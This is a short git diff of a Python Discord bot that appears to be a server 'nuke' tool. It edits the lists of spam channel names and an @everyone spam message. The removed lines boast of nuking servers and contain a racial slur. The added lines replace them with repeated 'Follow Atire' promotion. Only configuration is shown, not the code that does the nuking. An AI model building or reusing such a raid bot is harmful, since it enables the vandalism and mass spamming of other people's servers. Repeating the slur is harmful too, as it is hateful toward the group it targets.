@@ -8,8 +8,8 @@ import asyncio
 import keep_alive
 
 
-SPAM_CHANNEL =  ["0x Was Here" , "Nuked By 0x" , "Fucked by 0x" , "0x Was Here","Nuked By 0x","Fucked By 0x","0x Was Here","Nuked by 0x ","0x Is God","0x IS GOD","Nuked by 0x","0x Papa Here","Nuked Niggas"]
-SPAM_MESSAGE = ["@everyone Nuked Niggas https://media.discordapp.net/attachments/945094984657420383/996858442352427169/unknown.png  "] 
+SPAM_CHANNEL =  ["Follow Atire" , "Follow Atire" , "Follow Atire" , "Follow Atire","Follow Atire","Follow Atire","Follow Atire","Follow Atire ","Follow Atire","Follow Atire","Follow Atire","Follow Atire","Follow Atire"]
+SPAM_MESSAGE = ["@everyone Follow Atire https://media.discordapp.net/attachments/945094984657420383/996858442352427169/unknown.png  "] 
 
 client = commands.Bot(command_prefix=".")
 client.remove_command(name="help" )
